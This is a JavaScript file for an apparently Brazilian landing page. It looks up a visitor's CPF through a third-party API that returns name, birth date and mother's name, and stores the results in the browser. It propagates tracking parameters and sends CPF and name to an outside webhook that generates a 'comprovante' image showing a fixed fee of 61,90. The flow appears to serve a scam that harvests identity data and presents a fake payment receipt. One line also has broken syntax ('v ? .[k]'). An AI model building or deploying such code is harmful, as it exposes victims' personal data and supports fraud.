// ============================================================
// functions.js — robusto (UTM + CPF + Comprovante) SEM alterar HTML
// ============================================================

// ------------------------------------------------------------
// Helpers globais (tipos e logs)
// ------------------------------------------------------------
const _isHttp = (s) => typeof s === 'string' && /^https?:\/\//i.test(s);
const _isData = (s) => typeof s === 'string' && /^data:image\/[a-zA-Z+.-]+;base64,/i.test(s);

// Cache do comprovante por chave (cpf|name|data|tax)
let _comprovanteCache = {
    key: null,
    src: null
};

// Logs globais
window.addEventListener('error', (e) => {
    console.error('JS Error:', e.message, 'em', e.filename + ':' + e.lineno);
});
window.addEventListener('unhandledrejection', (e) => {
    console.error('Promise rejeitada sem catch:', e.reason);
});

// ------------------------------------------------------------
// Persistência dos parâmetros da primeira visita
// ------------------------------------------------------------
(function persistLandingQS() {
    try {
        if (!sessionStorage.getItem('landing_qs') && window.location.search.length > 1) {
            sessionStorage.setItem('landing_qs', window.location.search);
        }
    } catch (e) {
        console.warn('[UTM] persist landing qs falhou:', e);
    }
})();

// ------------------------------------------------------------
// Coleta de parâmetros de TODAS as fontes possíveis
// (URL atual, sessionStorage, referrer, cookies, localStorage)
// ------------------------------------------------------------
const _cookieParamNames = [
    // comuns
    'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content',
    'gclid', 'fbclid', 'msclkid',
    // variações que vejo bastante
    'cid', 'ad_id', 'subid', 'sub_id', 'sub1', 'sub2', 'sub3', 'sub4', 'sub5'
];

function _pickAllParams(qs) {
    const out = new URLSearchParams();
    if (!qs || qs.length <= 1) return out;
    new URLSearchParams(qs).forEach((v, k) => {
        if (!out.has(k)) out.set(k, v);
    });
    return out;
}

function _paramsFromReferrer() {
    try {
        if (!document.referrer) return new URLSearchParams();
        const ref = new URL(document.referrer);
        return _pickAllParams(ref.search);
    } catch {
        return new URLSearchParams();
    }
}

function _paramsFromCookies() {
    const out = new URLSearchParams();
    if (!document.cookie) return out;
    document.cookie.split(';').forEach(pair => {
        const idx = pair.indexOf('=');
        if (idx === -1) return;
        const key = decodeURIComponent(pair.slice(0, idx).trim());
        const val = decodeURIComponent(pair.slice(idx + 1).trim());
        // pega apenas chaves conhecidas ou que começam com utm_
        if (_cookieParamNames.includes(key) || /^utm_/i.test(key)) {
            if (!out.has(key)) out.set(key, val);
        }
    });
    return out;
}

function _paramsFromLocalStorage() {
    const out = new URLSearchParams();
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const k = localStorage.key(i);
            if (!k) continue;
            if (/^utm_/i.test(k) || /^(gclid|fbclid|msclkid)$/i.test(k)) {
                const v = localStorage.getItem(k);
                if (v != null && v !== '' && !out.has(k)) out.set(k, v);
            }
        }
    } catch {}
    return out;
}

function _mergeParamsPriority(...paramsList) {
    // mantém o primeiro valor encontrado (sem sobrescrever)
    const out = new URLSearchParams();
    paramsList.forEach(ps => ps.forEach((v, k) => {
        if (!out.has(k)) out.set(k, v);
    }));
    return out;
}

function _collectAllParams() {
    // 1) URL atual
    const current = _pickAllParams(window.location.search);
    // 2) sessionStorage da primeira visita
    let landing = new URLSearchParams();
    try {
        landing = _pickAllParams(sessionStorage.getItem('landing_qs') || '');
    } catch {}
    // 3) referrer (caso seu servidor remova query da URL atual)
    const fromRef = _paramsFromReferrer();
    // 4) cookies (utm_*, gclid, fbclid, msclkid, etc.)
    const fromCookies = _paramsFromCookies();
    // 5) localStorage (utm_* ou chaves conhecidas)
    const fromLS = _paramsFromLocalStorage();

    // Prioridade: URL atual > landing > referrer > cookies > localStorage
    return _mergeParamsPriority(current, landing, fromRef, fromCookies, fromLS);
}

// ------------------------------------------------------------
// Monta URL de redirect com todos os parâmetros disponíveis
// ------------------------------------------------------------
function _mergeSearchParams(base, extra) {
    const final = new URLSearchParams(base.toString());
    extra.forEach((v, k) => {
        if (!final.has(k)) final.set(k, v);
    });
    return final;
}

function _buildRedirectWithParams(destHref) {
    const dest = new URL(destHref, window.location.href);

    const allParams = _collectAllParams();
    const existing = new URLSearchParams(dest.search);
    const merged = _mergeSearchParams(existing, allParams);

    const qs = merged.toString();
    dest.search = qs ? '?' + qs : '';

    const finalUrl = dest.pathname + dest.search + dest.hash;

    // debug útil
    try {
        sessionStorage.setItem('utm_final_qs', qs);
        sessionStorage.setItem('utm_last_redirect', finalUrl);
    } catch {}

    console.log('[UTM] Redirect final:', finalUrl);
    return finalUrl;
}

// ------------------------------------------------------------
// Propagação automática em links e formulários (na própria página)
// ------------------------------------------------------------
(function propagateOnPage() {
    const paramsAll = _collectAllParams();
    if ([...paramsAll.keys()].length === 0) return; // nada a fazer

    function mergeParamsIntoUrl(url) {
        const existing = new URLSearchParams(url.search);
        paramsAll.forEach((v, k) => {
            if (!existing.has(k)) existing.set(k, v);
        });
        url.search = existing.toString() ? '?' + existing.toString() : '';
        return url;
    }

    function tagLinks(root) {
        const scope = (root && root.querySelectorAll) ? root : document;
        scope.querySelectorAll('a[href]').forEach(a => {
            const href = a.getAttribute('href');
            if (!href) return;
            const low = href.toLowerCase();
            if (low.startsWith('mailto:') || low.startsWith('tel:') ||
                low.startsWith('javascript:') || low.startsWith('#')) return;
            let url;
            try {
                url = new URL(href, window.location.origin);
            } catch {
                return;
            }
            if (url.origin !== window.location.origin) return; // mesma origem
            mergeParamsIntoUrl(url);
            a.setAttribute('href', url.pathname + url.search + url.hash);
        });
    }

    function createHidden(name, value) {
        const i = document.createElement('input');
        i.type = 'hidden';
        i.name = name;
        i.value = value;
        return i;
    }

    function tagForms(root) {
        const scope = (root && root.querySelectorAll) ? root : document;
        scope.querySelectorAll('form').forEach(f => {
            const method = (f.getAttribute('method') || 'get').toLowerCase();
            const action = f.getAttribute('action') || '';
            let url;
            try {
                url = new URL(action || window.location.href, window.location.origin);
            } catch {
                url = new URL(window.location.href);
            }

            if (method === 'get') {
                mergeParamsIntoUrl(url);
                f.setAttribute('action', url.pathname + url.search + url.hash);
            } else {
                const existing = new Set(
                    Array.from(f.querySelectorAll('input[name]')).map(i => i.name)
                );
                paramsAll.forEach((v, k) => {
                    if (!existing.has(k)) f.appendChild(createHidden(k, v));
                });
            }
        });
    }

    function runAll(root) {
        tagLinks(root);
        tagForms(root);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            runAll(document);
            observeDom();
        });
    } else {
        runAll(document);
        observeDom();
    }

    function observeDom() {
        const mo = new MutationObserver((muts) => {
            muts.forEach(m => {
                m.addedNodes.forEach(node => {
                    if (node.nodeType !== 1) return;
                    if (node.matches && node.matches('a[href], form')) runAll(node);
                    runAll(node);
                });
            });
        });
        mo.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
})();

// ------------------------------------------------------------
// Fetch com fallback para proxy (CORS) — tolerante a text/plain
// ------------------------------------------------------------
async function fetchJsonWithCorsFallback(url) {
    try {
        const r = await fetch(url, {
            headers: {
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        const ct = r.headers.get('content-type') || '';
        return ct.includes('application/json') ? await r.json() : JSON.parse(await r.text());
    } catch (err) {
        console.warn('[CORS/Fetch] tentando via proxy:', err.message);
        const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);
        const r2 = await fetch(proxyUrl, {
            headers: {
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (!r2.ok) throw new Error(`Proxy HTTP ${r2.status}`);
        const txt = await r2.text();
        try {
            return JSON.parse(txt);
        } catch (e2) {
            console.error('[Proxy] Falha ao parsear JSON]:', e2, 'RAW=', txt.slice(0, 200));
            throw err;
        }
    }
}

// ------------------------------------------------------------
// Extrai a imagem do JSON (aceita http(s) e data URI)
// ------------------------------------------------------------
function extractImageSrcFromJson(json) {
    if (!json || typeof json !== 'object') return null;

    const paths = [
        ['data', 'image'],
        ['image'],
        ['url'],
        ['link'],
        ['data', 'url'],
        ['data', 'link'],
    ];

    for (const p of paths) {
        let v = json;
        for (const k of p) v = v ? .[k];
        if (typeof v === 'string') {
            const s = v.trim();
            if (_isHttp(s) || _isData(s)) return s;
        }
    }

    const str = JSON.stringify(json);
    const mHttp = str.match(/https?:\/\/[^"']+\.(?:png|jpe?g|webp|gif)/i);
    if (mHttp) return mHttp[0];

    const mData = str.match(/data:image\/[a-zA-Z+.-]+;base64,[A-Za-z0-9+/=]+/);
    return mData ? mData[0] : null;
}

// ------------------------------------------------------------
// Gera/obtém a imagem do comprovante (com cache por chave)
// ------------------------------------------------------------
async function prefetchComprovante() {
    const cpf = (localStorage.getItem('cpf') || '').replace(/\D/g, '');
    const name = localStorage.getItem('name') || '';
    const dataHoje = new Date().toLocaleDateString('pt-BR'); // dd/mm/aaaa
    const tax = '61,90';

    const cacheKey = `${cpf}|${name}|${dataHoje}|${tax}`;
    if (_comprovanteCache.key === cacheKey && _comprovanteCache.src) return _comprovanteCache.src;

    const qs = new URLSearchParams({
        cpf,
        name,
        data: dataHoje,
        tax
    });
    const endpoint = `https://webhook.bestbot.su/webhook/api?${qs.toString()}`;

    console.log('[Comprovante] webhook:', endpoint);

    const json = await fetchJsonWithCorsFallback(endpoint);
    console.log('[Comprovante] resposta JSON:', json);

    const src = extractImageSrcFromJson(json);
    if (!src) throw new Error('JSON sem URL/BASE64 de imagem');

    _comprovanteCache = {
        key: cacheKey,
        src
    };
    return src;
}

// ------------------------------------------------------------
// Mostra a imagem no Step 14 (cria elementos se não existirem)
// ------------------------------------------------------------
async function showComprovante() {
    try {
        const step14 = document.getElementById('step14') || document.body;
        const container =
            step14.querySelector('.relative') ||
            step14.querySelector('[data-comprovante-container]') ||
            step14;

        let skeleton = document.getElementById('comprovanteSkeleton');
        if (!skeleton) {
            skeleton = document.createElement('div');
            skeleton.id = 'comprovanteSkeleton';
            skeleton.className = 'w-full h-64 bg-gray-200 animate-pulse rounded-xl';
            container.appendChild(skeleton);
        }
        skeleton.classList.remove('hidden');

        let img = document.getElementById('comprovanteImg');
        if (!img) {
            img = document.createElement('img');
            img.id = 'comprovanteImg';
            img.className = 'hidden w-full h-auto rounded-lg shadow-sm';
            img.alt = 'Gerando comprovante...';
            container.appendChild(img);
        }
        img.classList.add('hidden');
        img.removeAttribute('src');

        const src = await prefetchComprovante();

        await new Promise((resolve, reject) => {
            const probe = new Image();
            probe.decoding = 'async';
            probe.onload = resolve;
            probe.onerror = reject;
            probe.src = src;
        });

        img.src = _isHttp(src) ? src + (src.includes('?') ? '&' : '?') + 't=' + Date.now() : src;
        img.alt = 'Comprovante gerado';
        img.loading = 'eager';
        img.decoding = 'sync';

        img.classList.remove('hidden');
        skeleton.classList.add('hidden');
        console.log('[Comprovante] imagem exibida');
    } catch (e) {
        console.error('[Comprovante] falhou:', e);
        const img = document.getElementById('comprovanteImg');
        const skeleton = document.getElementById('comprovanteSkeleton');
        if (img) {
            img.removeAttribute('src');
            img.alt = 'Não foi possível carregar o comprovante no momento.';
            img.classList.remove('hidden');
        }
        if (skeleton) skeleton.classList.add('hidden');
    }
}

// ============================================================
// Fluxo principal (form + redirect preservando parâmetros)
// ============================================================
document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    const cpfInput = document.getElementById('cpf');
    if (!form || !cpfInput) return;

    // Formata CPF
    cpfInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 11) value = value.slice(0, 11);
        if (value.length > 9) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
        } else if (value.length > 6) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
        } else if (value.length > 3) {
            value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
        }
        e.target.value = value;
    });

    // Submit com redirect preservando parâmetros
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const cpf = cpfInput.value.replace(/\D/g, '');
        if (cpf.length !== 11) {
            alert('Por favor, digite um CPF válido');
            return;
        }

        const submitButton = form.querySelector('button[type="submit"]');
        const originalButtonText = submitButton.innerHTML;
        submitButton.innerHTML = '<div class="loader" style="display:inline-block;"></div> Consultando...';
        submitButton.disabled = true;

        try {
            const url = `https://apionlineconsulta.vercel.app/api/proxy?cpf=${encodeURIComponent(cpf)}`;
            const data = await fetchJsonWithCorsFallback(url);

            if (!data || !data.dadosBasicos) {
                console.error('[CPF] JSON inesperado:', data);
                alert('CPF não encontrado na base de dados.');
                return;
            }

            // Persistência básica
            localStorage.setItem('dadosBasicos', JSON.stringify(data));
            localStorage.setItem('cpf', String(data.dadosBasicos.cpf || cpf).replace(/\D/g, ''));
            localStorage.setItem('name', data.dadosBasicos.nome || '');
            localStorage.setItem('nasc', data.dadosBasicos.nascimento || '');
            localStorage.setItem('name_m', data.dadosBasicos.mae || '');

            // >>> Redireciona (mantendo a sua rota) e preservando parâmetros
            const finalUrl = _buildRedirectWithParams('../video/');
            window.location.href = finalUrl;

        } catch (error) {
            alert('Erro ao consultar o CPF. Verifique o console do navegador para detalhes.');
            console.error('[CPF] Falha na consulta:', error);
        } finally {
            submitButton.innerHTML = originalButtonText;
            submitButton.disabled = false;
        }
    });
});